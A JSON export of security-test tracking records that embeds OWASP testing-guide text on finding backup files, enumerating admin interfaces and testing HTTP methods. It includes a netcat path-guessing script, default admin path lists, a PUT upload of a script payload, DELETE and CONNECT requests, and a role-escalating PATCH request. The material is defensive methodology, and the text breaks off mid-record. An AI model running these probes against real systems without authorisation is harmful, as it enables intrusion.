Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":"2024-06-12T21:14:46.4344022+00:00","Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nWhile most of the files within a web server are directly handled by the server itself, it isn\u2019t uncommon to find unreferenced or forgotten files that can be used to obtain important information about the infrastructure or the credentials.\nMost common scenarios include the presence of renamed old versions of modified files, inclusion files that are loaded into the language of choice and downloaded as source, and even automatic or manual backups in the form of compressed archives. Backup files can also be generated automatically by the underlying file system the application is hosted on, a feature usually referred to as \u201Csnapshots\u201D.\nAll these files may grant the tester access to inner workings, back doors, administrative interfaces, or even credentials to connect to the administrative interface or the database server.\nAn important source of vulnerability is found in files unrelated to the application. These files may be created when editing application files, creating on-the-fly backup copies, or leaving old or unreferenced files in the web tree. Performing in-place editing or other administrative actions on production web servers may inadvertently leave backup copies, either generated automatically by the editor while editing files, or by the administrator who is zipping a set of files to create a backup.\nIt is easy to forget such files and this may pose a serious security threat to the application. It happens because backup copies may be generated with file extensions differing from those of the original files. A \u0060.tar\u0060, \u0060.zip\u0060 or \u0060.gz\u0060 archive that we generate (and might forget) has obviously a different extension, and the same happens with automatic copies created by many editors (for example, emacs generates a backup copy named \u0060file~\u0060 when editing \u0060file\u0060). Making a copy manually can produce a similar effect, such as when \u2018file\u2019 is copied as \u2018file.old\u2019. The underlying file system the application is on could be making \u0060snapshots\u0060 of your application at different points in time without your knowledge, which may also be accessible via the web, posing a similar but different \u0060backup file\u0060 style threat to your application.\nAs a result, these activities generate files that are not needed by the application and may be handled differently than the original file by the web server. For example, if we make a copy of login.asp and name it login.asp.old without proper security measures, it could potentially allow users to download the source code of login.asp. This is because \u0060login.asp.old\u0060 will be typically served as text or plain, rather than being executed because of its extension. In other words, accessing \u0060login.asp\u0060 causes the execution of the server-side code of \u0060login.asp\u0060, while accessing \u0060login.asp.old\u0060 causes the content of \u0060login.asp.old\u0060 (which is, again, server-side code) to be plainly returned to the user and displayed in the browser. This may pose security risks, since sensitive information may be revealed.\nGenerally, exposing server-side code is a bad idea. Not only are you unnecessarily exposing business logic, but you may be unknowingly revealing application-related information which may help an attacker (path names, data structures, etc.). Not to mention the fact that there are too many scripts with embedded username and password in clear text (which is a careless and extremely dangerous practice).\nOther causes of unreferenced files are due to design or configuration choices when they allow diverse kind of application-related files such as data files, configuration files, log files, to be stored in file system directories that can be accessed by the web server. These files have normally no reason to be in a file system space that could be accessed via web, since they should be accessed only at the application level, by the application itself (and not by the casual user browsing around).\n\n### Threats\n\nOld, backup and unreferenced files present various threats to the security of a web application:\n\n* Unreferenced files may disclose sensitive information that can facilitate a focused attack against the application; for example, include files containing database credentials, configuration files containing references to other hidden content, absolute file paths, etc.\n* Unreferenced pages may contain powerful functionality that can be used to attack the application; for example, an administration page that is not linked from published content but can be accessed by any user who knows where to find it.\n* Old and backup files may contain vulnerabilities that have been fixed in more recent versions; for example, \u0060viewdoc.old.jsp\u0060 may contain a directory traversal vulnerability that has been fixed in \u0060viewdoc.jsp\u0060 but can still be exploited by anyone who finds the old version.\n* Backup files may disclose the source code for pages designed to execute on the server; for example, requesting \u0060viewdoc.bak\u0060 may return the source code for \u0060viewdoc.jsp\u0060, which can be reviewed for vulnerabilities that may be difficult to find by making blind requests to the executable page. While this threat applies to scripting languages such as Perl, PHP, ASP, shell scripts, JSP, etc., it is not limited to them, as shown in the example provided in the next point.\n* Backup archives may contain copies of all files within (or even outside) the webroot. This allows an attacker to quickly enumerate the entire application, including unreferenced pages, source code, include files, etc. For example, if you forget a file named \u0060myservlets.jar.old\u0060 containing a backup copy of your servlet implementation classes, you are exposing a lot of sensitive information which can be decompiled and reverse engineered.\n* In some cases, copying or editing a file modifies the filename but leaves the file extension intact. This is common in Windows environments, where file copying operations generate filenames prefixed with \u201CCopy of \u201C or localized versions of this string. Since the file extension is left unchanged, this is not a case where an executable file is returned as plain text by the web server, and therefore not a case of source code disclosure. However, these files are dangerous too because there is a chance that they include obsolete and incorrect logic that, when invoked, could trigger application errors, which might yield valuable information to an attacker if diagnostic message display is enabled.\n* Log files may contain sensitive information about the activities of application users, for example, sensitive data passed in URL parameters, session IDs, URLs visited (which may disclose additional unreferenced content), etc. Other log files (e.g. ftp logs) may contain sensitive information about the maintenance of the application by system administrators.\n* File system snapshots may contain copies of the code that contain vulnerabilities that have been fixed in more recent versions. For example, \u0060/.snapshot/monthly.1/view.php\u0060 may contain a directory traversal vulnerability that has been fixed in \u0060/view.php\u0060 but can still be exploited by anyone who finds the old version.\n\n\n\u003Cbr\u003E\n","TestingInstructions":null,"Details":"## Test Objectives\n\n* Find and analyse unreferenced files that might contain sensitive information.\n\n## How to Test\n\n### Black-Box Testing\n\nTesting for unreferenced files uses both automated and manual techniques, and typically involves a combination of the following:\n\n#### Inference from the Naming Scheme Used for Published Content\n\nEnumerate all of the application\u2019s pages and functionality. This can be done manually using a browser, or using an application spidering tool. Most applications use a recognizable naming scheme, and organize resources into pages and directories using words that describe their function. It is often possible to infer the name and location of unreferenced pages from the naming scheme used for published content. For example, if a page titled viewuser.asp is found, one should also look for edituser.asp, adduser.asp, and deleteuser.asp. Similarly, if a directory /app/user is discovered, one should also search for /app/admin and /app/manager.\n\n#### Other Clues in Published Content\n\nMany web applications leave clues in published content that can lead to the discovery of hidden pages and functionality. These clues can often be found in the source code of HTML and JavaScript files. The source code for all published content should be manually reviewed to identify clues about other pages and functionality. For example:\nProgrammers\u2019 comments and commented-out sections of source code may refer to hidden content:\n\n\u0060\u0060\u0060\n\u003C!-- \u003CA HREF=\u0022uploadfile.jsp\u0022\u003EUpload a document to the server\u003C/A\u003E --\u003E\n\u003C!-- Link removed while bugs in uploadfile.jsp are fixed          --\u003E\n\u0060\u0060\u0060\n\nJavaScript may contain page links that are only rendered within the user\u2019s GUI under certain circumstances:\n\n\u0060\u0060\u0060\nvar adminUser=false;\nif (adminUser) menu.add (new menuItem (\u0022Maintain users\u0022, \u0022/admin/useradmin.jsp\u0022));\n\u0060\u0060\u0060\n\nHTML pages may contain FORMs that have been hidden by disabling the SUBMIT element:\n\n\u0060\u0060\u0060\n\u003Cform action=\u0022forgotPassword.jsp\u0022 method=\u0022post\u0022\u003E\n    \u003Cinput type=\u0022hidden\u0022 name=\u0022userID\u0022 value=\u0022123\u0022\u003E\n    \u003C!-- \u003Cinput type=\u0022submit\u0022 value=\u0022Forgot Password\u0022\u003E --\u003E\n\u003C/form\u003E\n\u0060\u0060\u0060\n\nAnother source of clues about unreferenced directories is the \u0060/robots.txt\u0060 file used to provide instructions to web robots:\n\n\u0060\u0060\u0060\nUser-agent: *\nDisallow: /Admin\nDisallow: /uploads\nDisallow: /backup\nDisallow: /~jbloggs\nDisallow: /include\n\u0060\u0060\u0060\n\n#### Blind Guessing\n\nIn its simplest form, this involves running a list of common filenames through a request engine in an attempt to guess files and directories that exist on the server. The following netcat wrapper script will read a wordlist from stdin and perform a basic guessing attack:\n\n\u0060\u0060\u0060\n#!/bin/bash\n\nserver=example.org\nport=80\n\nwhile read url\ndo\necho -ne \u0022$url\\t\u0022\necho -e \u0022GET /$url HTTP/1.0\\nHost: $server\\n\u0022 | netcat $server $port | head -1\ndone | tee outputfile\n\u0060\u0060\u0060\n\nDepending upon the server, GET may be replaced with HEAD for faster results. The output file specified can be grepped for \u201Cinteresting\u201D response codes. The response code 200 (OK) usually indicates that a valid resource has been found (provided the server does not deliver a custom \u201Cnot found\u201D page using the 200 code). But also look out for 301 (Moved), 302 (Found), 401 (Unauthorized), 403 (Forbidden) and 500 (Internal error), which may also indicate resources or directories that are worthy of further investigation.\nThe basic guessing attack should be run against the webroot, and also against all directories that have been identified through other enumeration techniques. More advanced/effective guessing attacks can be performed as follows:\n\n* Identify the file extensions in use within known areas of the application (e.g. JSP, ASPX, HTML), and use a basic wordlist appended with each of these extensions (or use a longer list of common extensions if resources permit).\n* For each file identified through other enumeration techniques, create a custom wordlist derived from that filename. Get a list of common file extensions (including \\~, bak, txt, src, dev, old, inc, orig, copy, tmp, swp, etc.) and use each extension before, after, and instead of, the extension of the actual filename.\n\nNote: Windows file copying operations generate filenames prefixed with \u201CCopy of \u201C or localized versions of this phrase, hence they do not change file extensions. While \u201CCopy of \u201C files typically do not disclose source code when accessed, they might yield valuable information in case they cause errors when invoked.\n\n#### Information Obtained Through Server Vulnerabilities and Misconfiguration\n\nThe most obvious way in which a misconfigured server may disclose unreferenced pages is through directory listing. Request all enumerated directories to identify any which provide a directory listing.\nNumerous vulnerabilities have been found in individual web servers which allow an attacker to enumerate unreferenced content, for example:\n\n* Apache ?M=D directory listing vulnerability.\n* Various IIS script source disclosure vulnerabilities.\n* IIS WebDAV directory listing vulnerabilities.\n\n#### Use of Publicly Available Information\n\nPages and functionality in internet-facing web applications that are not referenced from within the application itself may be referenced from other public domain sources. There are various sources of these references:\n\n* Pages that used to be referenced may still appear in the archives of internet search engines. For example, \u00601998results.asp\u0060 may no longer be linked from a company\u2019s site, but may remain on the server and in search engine databases. This old script may contain vulnerabilities that could be used to compromise the entire site. The \u0060site:\u0060 Google search operator may be used to run a query only against the domain of choice, such as in: \u0060site:www.example.com\u0060. Using search engines in this way has led to a broad array of techniques which you may find useful, and are described in the \u0060Google Hacking\u0060 section of this Guide. Check it to hone your testing skills via Google. Backup files are not likely to be referenced by any other files and therefore may have not been indexed by Google, but if they lie in browsable directories the search engine might know about them.\n* In addition, Google and Yahoo keep cached versions of pages found by their robots. Even if \u00601998results.asp\u0060 has been removed from the target server, a version of its output may still be stored by these search engines. The cached version may contain references to, or clues about, additional hidden content that still remains on the server.\n* Content that is not referenced from within a target application may be linked to by third-party sites. For example, an application which processes online payments on behalf of third-party traders may contain a variety of bespoke functionality which can (normally) only be found by following links within the sites of its customers.\n\n#### Filename Filter Bypass\n\nBecause deny list filters are based on regular expressions, one can sometimes take advantage of obscure OS filename expansion features which work in ways the developer didn\u2019t expect. The tester can sometimes exploit differences in ways that filenames are parsed by the application, web server, and underlying OS and it\u2019s filename conventions.\nExample: Windows 8.3 filename expansion \u0060c:\\\\program files\u0060 becomes \u0060C:\\\\PROGRA\\~1\u0060\n\n* Remove incompatible characters\n* Convert spaces to underscores\n* Take the first six characters of the basename\n* Add \u0060~\u003Cdigit\u003E\u0060 which is used to distinguish files with names using the same six initial characters\n* This convention changes after the first 3 name collisions\n* Truncate file extension to three characters\n* Make all the characters uppercase\n\n### Gray-Box Testing\n\nPerforming gray-box testing against old and backup files necessitates the examination of files within directories that belong to the set of web directories served by the web server(s) comprising the web application infrastructure. Theoretically the examination should be performed by hand to be thorough. However, since in most cases copies of files or backup files tend to be created by using the same naming conventions, the search can be easily scripted. For example, editors leave behind backup copies by naming them with a recognizable extension or ending and humans tend to leave behind files with a \u0060.old\u0060 or similar predictable extensions. A useful strategy would be to periodically schedule a background job to check for files with extensions that are likely to be identified as copies or backup files, while also performing manual checks on a longer time basis.\n\n\u003Cbr\u003E\n## Tools\n\nVulnerability assessment tools tend to include checks to spot web directories having standard names (such as \u201Cadmin\u201D, \u201Ctest\u201D, \u201Cbackup\u201D, etc.), and to report any web directory which allows indexing. If the tester is unable to find directory listing, they should try to check for probable backup extensions. Some tools that can help with this include:\n\n* [Nessus](https://www.tenable.com/products/nessus)\n* [Nikto2](https://cirt.net/Nikto2)\n\nWeb spider tools\n\n* [wget](https://www.gnu.org/software/wget/)\n* [Wget for Windows](http://www.interlog.com/~tcharron/wgetwin.html)\n* [Sam Spade](https://web.archive.org/web/20090926061558/http://preview.samspade.org/ssw/download.html)\n* [Spike proxy includes a site crawler function](https://www.spikeproxy.com/)\n* [Xenu](http://home.snafu.de/tilman/xenulink.html)\n* [curl](https://curl.haxx.se/)\n\nSome of them are also included in standard Linux distributions. Web development tools usually include facilities to identify broken links and unreferenced files.\n\n\u003Cbr\u003E\n","Implication":null,"Recommendation":"## Remediation\n\nFor an effective protection strategy, testing should be combined with a security policy that clearly forbids dangerous practices, including:\n\n* Editing files in-place on the web server or application server file systems. This is a particularly bad habit, since it is likely to generate backup or temporary files by the editors. It is amazing to see how often this is done, even in large organizations. If you absolutely need to edit files on a production system, do ensure that you don\u2019t leave behind anything that is not explicitly intended, and keep in mind that you are doing it at your own risk.\n* Carefully check any other activity performed on file systems exposed by the web server, such as spot administration activities. For example, if you occasionally need to take a snapshot of a couple of directories (which you should not do on a production system), you may be tempted to zip them first. Be careful not to leave behind such archive files.\n* Appropriate configuration management policies should help prevent obsolete and un-referenced files.\n* Applications should be designed not to create (or rely on) files stored under the web directory trees served by the web server. Data files, log files, configuration files, etc. should be stored in directories not accessible by the web server to counter the possibility of information disclosure, not to mention the potential for data modification if web directory permissions allow writing.\n* File system snapshots should not be accessible via the web if the document root is on a file system using this technology. Configure your web server to deny access to such directories, for example, under Apache, a location directive like this should be used:\n\n\u0060\u0060\u0060\n\u003CLocation ~ \u0022.snapshot\u0022\u003E\n    Order deny,allow\n    Deny from all\n\u003C/Location\u003E\n\u0060\u0060\u0060","References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1"}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-05 Enumerate Infrastructure and Application Admin Interfaces","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nAdministrator interfaces may be present in the application or on the application server to allow certain users to perform privileged activities on the site. Tests should be undertaken to reveal if and how this privileged functionality can be accessed by an unauthorized or standard user.\nAn application may require an administrator interface to enable a privileged user to access functionality that may make changes to how the site functions. Such changes may include:\n\n* user account provisioning\n* site design and layout\n* data manipulation\n* configuration changes\n\nIn many instances, such interfaces do not have sufficient controls to protect them from unauthorized access. Testing is aimed at discovering these administrator interfaces and accessing functionality intended for the privileged users.","TestingInstructions":"## Test Objectives\n\n* Identify hidden administrator interfaces and functionality.\n\n## How to Test\n\n### Black Box Testing\n\nThe following section describes vectors that may be used to test for the presence of administrative interfaces. These techniques may also be used to test for related issues including privilege escalation, and are described elsewhere in this guide (for example, [Testing for bypassing authorization schema](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema) and [Testing for Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)) in greater detail.\n\n* Directory and file enumeration: An administrative interface may be present but not visibly available to the tester. The path of the administrative interface may be guessed by simple requests such as /admin or /administrator. In some scenarios, these paths can be revealed within seconds using advanced Google search techniques - [Google dorks](https://www.exploit-db.com/google-hacking-database). There are many tools available to perform brute forcing of server contents, see the tools section below for more information. A tester may have to also identify the filename of the administration page. Forcibly browsing to the identified page may provide access to the interface.\n* Comments and links in source code: Many sites use common code that is loaded for all site users. By examining all source sent to the client, links to administrator functionality may be discovered and should be investigated.\n* Reviewing server and application documentation: If the application server or application is deployed in its default configuration it may be possible to access the administration interface using information described in configuration or help documentation. Default password lists should be consulted if an administrative interface is found and credentials are required.\n* Publicly available information: Many applications, such as WordPress, have administrative interfaces that are available by default.\n* Alternative server port: Administration interfaces may be seen on a different port on the host than the main application. For example, Apache Tomcat\u2019s Administration interface can often be seen on port 8080.\n* Parameter tampering: A GET or POST parameter, or a cookie may be required to enable the administrator functionality. Clues to this include the presence of hidden fields such as:\n\n\u0060\u0060\u0060\n\u003Cinput type=\u0022hidden\u0022 name=\u0022admin\u0022 value=\u0022no\u0022\u003E\n\u0060\u0060\u0060\n\nor in a cookie:\n\u0060Cookie:\u00A0session_cookie;\u00A0useradmin=0\u0060\nOnce an administrative interface has been discovered, a combination of the above techniques may be used to attempt to bypass authentication. If this fails, the tester may wish to attempt a brute force attack. In such an instance, the tester should be aware of the potential for administrative account lockout if such functionality is present.\n\n### Gray Box Testing\n\nA more detailed examination of the server and application components should be undertaken to ensure hardening (i.e. administrator pages are not accessible to everyone through the use of IP filtering or other controls), and where applicable, verification that all components do not use default credentials or configurations. Source code should be reviewed to ensure that the authorization and authentication model ensures clear separation of duties between normal users and site administrators. User interface functions shared between normal and administrator users should be reviewed to ensure clear separation between the rendering of such components and the information leakage from such shared functionality.\nEach web framework may have its own default admin pages or paths, as in the following examples:\nPHP:\n\n\u0060\u0060\u0060\n/phpinfo\n/phpmyadmin/\n/phpMyAdmin/\n/mysqladmin/\n/MySQLadmin\n/MySQLAdmin\n/login.php\n/logon.php\n/xmlrpc.php\n/dbadmin\n\u0060\u0060\u0060\n\nWordPress:\n\n\u0060\u0060\u0060\nwp-admin/\nwp-admin/about.php\nwp-admin/admin-ajax.php\nwp-admin/admin-db.php\nwp-admin/admin-footer.php\nwp-admin/admin-functions.php\nwp-admin/admin-header.php\n\u0060\u0060\u0060\n\nJoomla:\n\n\u0060\u0060\u0060\n/administrator/index.php\n/administrator/index.php?option=com_login\n/administrator/index.php?option=com_content\n/administrator/index.php?option=com_users\n/administrator/index.php?option=com_menus\n/administrator/index.php?option=com_installer\n/administrator/index.php?option=com_config\n\u0060\u0060\u0060\n\nTomcat:\n\n\u0060\u0060\u0060\n/manager/html\n/host-manager/html\n/manager/text\n/tomcat-users.xml\n\u0060\u0060\u0060\n\nApache:\n\n\u0060\u0060\u0060\n/index.html\n/httpd.conf\n/apache2.conf\n/server-status\n\u0060\u0060\u0060\n\nNginx:\n\n\u0060\u0060\u0060\n/index.html\n/index.htm\n/index.php\n/nginx_status\n/index.php\n/nginx.conf\n/html/error\n\u0060\u0060\u0060\n\n## Tools\n\nSeveral tools can assist in identifying hidden administrator interfaces and functionality, including:\n\n* [ZAP - Forced Browse](https://www.zaproxy.org/docs/desktop/addons/forced-browse/) is a currently maintained use of OWASP\u2019s previous DirBuster project.\n* [THC-HYDRA](https://github.com/vanhauser-thc/thc-hydra) is a tool that allows brute-forcing of many interfaces, including form-based HTTP authentication.\n* A brute forcer is much more effective when it uses a good dictionary, such as the [Netsparker](https://www.netsparker.com/blog/web-security/svn-digger-better-lists-for-forced-browsing/) dictionary.","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [Cirt: Default Password list](https://cirt.net/passwords)\n* [FuzzDB can be used to do brute force browsing admin login path](https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/predictable-filepaths/login-file-locations/Logins.txt)\n* [Common admin or debugging parameters](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/business-logic/CommonDebugParamNames.txt)\n* [Seclists](https://github.com/danielmiessler/SecLists)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-06 Test HTTP Methods","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nHTTP offers a number of methods (or verbs) that can be used to perform actions on the web server. While GET and POST are by far the most common methods that are used to access information provided by a web server, there are a variety of other methods that may also be supported, and can sometimes be exploited by attackers.\n[RFC 7231](https://datatracker.ietf.org/doc/html/rfc7231) defines the main valid HTTP request methods (or verbs), although additional methods have been added in other RFCs, such as [RFC 5789](https://datatracker.ietf.org/doc/html/rfc5789). Several of these verbs have been re-used for different purposes in [RESTful](https://en.wikipedia.org/wiki/Representational_state_transfer) applications, listed in the table below.\n\n| Method | Original Purpose | RESTful Purpose |\n| ------ | ---------------- | --------------- |\n| [\u0060GET\u0060](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.1) | Request a file. | Request an object. |\n| [\u0060HEAD\u0060](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.2) | Request a file, but only return the HTTP headers. | \u00A0 |\n| [\u0060POST\u0060](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.3) | Submit data. | \u00A0 |\n| [\u0060PUT\u0060](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.4) | Upload a file. | Create an object. |\n| [\u0060DELETE\u0060](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.5) | Delete a file | Delete an object. |\n| [\u0060CONNECT\u0060](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.6) | Establish a connection to another system. | \u00A0 |\n| [\u0060OPTIONS\u0060](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.7) | List supported HTTP methods. | Perform a [CORS Preflight](https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request) request. |\n| [\u0060TRACE\u0060](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.8) | Echo the HTTP request for debug purposes. | \u00A0 |\n| [\u0060PATCH\u0060](https://datatracker.ietf.org/doc/html/rfc5789#section-2) | \u00A0 | Modify an object. |\n\n\n\u003Cbr\u003E\n","TestingInstructions":null,"Details":"## Test Objectives\n\n* Enumerate supported HTTP methods.\n* Test for access control bypass.\n* Test HTTP method overriding techniques.\n\n## How to Test\n\n### Discover the Supported Methods\n\nTo perform this test, the tester needs a way to identify which HTTP methods are supported by the web server that is being examined. The simplest way to do this is to make an \u0060OPTIONS\u0060 request to the server:\n\n\u0060\u0060\u0060\nOPTIONS / HTTP/1.1\nHost: example.org\n\u0060\u0060\u0060\n\nThe server should then respond with a list of supported methods:\n\n\u0060\u0060\u0060\nHTTP/1.1 200 OK\nAllow: OPTIONS, GET, HEAD, POST\n\u0060\u0060\u0060\n\nHowever, not all servers may respond to OPTIONS requests, and some may even return inaccurate information. It\u2019s also worth noting that servers may support different methods for different paths. This means that even if a method is not supported for the root / directory, it does not necessarily indicate that the same method won\u2019t be supported elsewhere.\nA more reliable way to test for supported methods is to simply make a request with that method type, and examine the server response. If the method is not permitted, the server should return a \u0060405 Method Not Allowed\u0060 status.\nNote that some servers treat unknown methods as equivalent to \u0060GET\u0060, so they may respond to arbitrary methods, such as the request shown below. This can occasionally be useful to evade a web application firewall, or any other filtering that blocks specific methods.\n\n\u0060\u0060\u0060\nFOO / HTTP/1.1\nHost: example.org\n\u0060\u0060\u0060\n\nRequests with arbitrary methods can also be made using curl with the \u0060-X\u0060 option:\n\n\u0060\u0060\u0060\ncurl -X FOO https://example.org\n\u0060\u0060\u0060\n\nThere are also a variety of automated tools that can attempt to determine supported methods, such as the [\u0060http-methods\u0060](https://nmap.org/nsedoc/scripts/http-methods.html) Nmap script. However, these tools may not test for dangerous methods (i.e., methods that may cause changes such as \u0060PUT\u0060 or \u0060DELETE\u0060), or may unintentionally cause changes to the web server if these methods are supported. As such, they should be used with care.\n\n### PUT and DELETE\n\nThe \u0060PUT\u0060 and \u0060DELETE\u0060 methods can have different effects, depending on whether they are being interpreted by the web server or by the application running on it.\n\n#### Legacy Web Servers\n\nSome legacy web servers allowed the use of the \u0060PUT\u0060 method to create files on the server. For example, if the server is configured to allow this, the request below would create a file on the server called \u0060test.html\u0060 with the contents \u0060\u003Cscript\u003Ealert(1)\u003C/script\u003E\u0060.\n\n\u0060\u0060\u0060\nPUT /test.html HTTP/1.1\nHost: example.org\nContent-Length: 25\n\n\u003Cscript\u003Ealert(1)\u003C/script\u003E\n\u0060\u0060\u0060\n\nSimilar requests can also be made with cURL:\n\n\u0060\u0060\u0060\ncurl https://example.org --upload-file test.html\n\u0060\u0060\u0060\n\nThis allows an attacker to upload arbitrary files to the webserver, which could potentially result in a full system compromise if they are allowed to upload executable code such as PHP files. However, this configuration is extremely rare, and is unlikely to be seen on modern systems.\nSimilarly, the \u0060DELETE\u0060 method can be used to delete files from the webserver. Please note that this is a **destructive action**; therefore, extreme care should be exercised when testing this method.\n\n\u0060\u0060\u0060\nDELETE /test.html HTTP/1.1\nHost: example.org\n\u0060\u0060\u0060\n\nOr with cURL:\n\n\u0060\u0060\u0060\ncurl http://example.org/test.html -X DELETE\n\u0060\u0060\u0060\n\n#### RESTful APIs\n\nBy contrast, the \u0060PUT\u0060 and \u0060DELETE\u0060 methods are commonly used by modern RESTful applications to create and delete objects. For example, the API request below could be used to create a user called \u201Cfoo\u201D with a role of \u201Cuser\u201D:\n\n\u0060\u0060\u0060\nPUT /api/users/foo HTTP/1.1\nHost: example.org\nContent-Length: 34\n\n{\n    \u0022role\u0022: \u0022user\u0022\n}\n\u0060\u0060\u0060\n\nA similar request with the DELETE method could be used to delete an object.\n\n\u0060\u0060\u0060\nDELETE /api/users/foo HTTP/1.1\nHost: example.org\n\u0060\u0060\u0060\n\nAlthough it may be reported by automated scanning tools, the presence of these methods on a RESTful API **is not a security issue**. However, this functionality may have other vulnerabilities (such as weak access control), and should be thoroughly tested.\n\n### TRACE\n\nThe \u0060TRACE\u0060 method (or Microsoft\u2019s equivalent \u0060TRACK\u0060 method) causes the server to echo back the contents of the request. This led to a vulnerability called Cross-Site Tracing (XST) to be published in [2003](https://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf) (PDF), which could be used to access cookies that had the \u0060HttpOnly\u0060 flag set. The \u0060TRACE\u0060 method has been blocked in all browsers and plugins for many years; as such, this issue is no longer exploitable. However, it may still be flagged by automated scanning tools, and the \u0060TRACE\u0060 method being enabled on a web server suggests that is has not been properly hardened.\n\n### CONNECT\n\nThe \u0060CONNECT\u0060 method causes the web server to open a TCP connection to another system, and then pass traffic from the client to that system. This could allow an attacker to proxy traffic through the server, in order to hide their source address, access internal systems or access services that are bound to localhost. An example of a \u0060CONNECT\u0060 request is shown below:\n\n\u0060\u0060\u0060\nCONNECT 192.168.0.1:443 HTTP/1.1\nHost: example.org\n\u0060\u0060\u0060\n\n### PATCH\n\nThe \u0060PATCH\u0060 method is defined in [RFC 5789](https://datatracker.ietf.org/doc/html/rfc5789), and is used to provide instructions on how an object should be modified. The RFC itself does not define what format these instructions should be in, but various methods are defined in other standards, such as the [RFC 6902 - JavaScript Object Notation (JSON) Patch](https://datatracker.ietf.org/doc/html/rfc6902).\nFor example, if we have a user called \u201Cfoo\u201D with the following properties:\n\n\u0060\u0060\u0060\n{\n    \u0022role\u0022: \u0022user\u0022,\n    \u0022email\u0022: \u0022foo@example.org\u0022\n}\n\u0060\u0060\u0060\n\nThe following JSON PATCH request could be used to change the role of this user to \u201Cadmin\u201D, without modifying the email address:\n\n\u0060\u0060\u0060\nPATCH /api/users/foo HTTP/1.1\nHost: example.org\n\n{ \u0022op\u0022: \u0022replace\u0022, \u0022path\u0022: \u0022/role\u0022, \u0022value\u0022: \u0022admin\u0022 }\n\u0060\u0060\u0060\n\nAlthough the RFC states that it should include instructions for how the object should be modified, the \u0060PATCH\u0060 method is commonly (mis)used to include the changed content instead, as shown below. Much like the previous request, this would change the \u201Crole\u201D value to \u201Cadmin\u201D without modifying the rest of the object. This is in contrast to the \u0060PUT\u0060 method, which would overwrite the entire object, and thus result in an object with no \u201Cemail\u201D 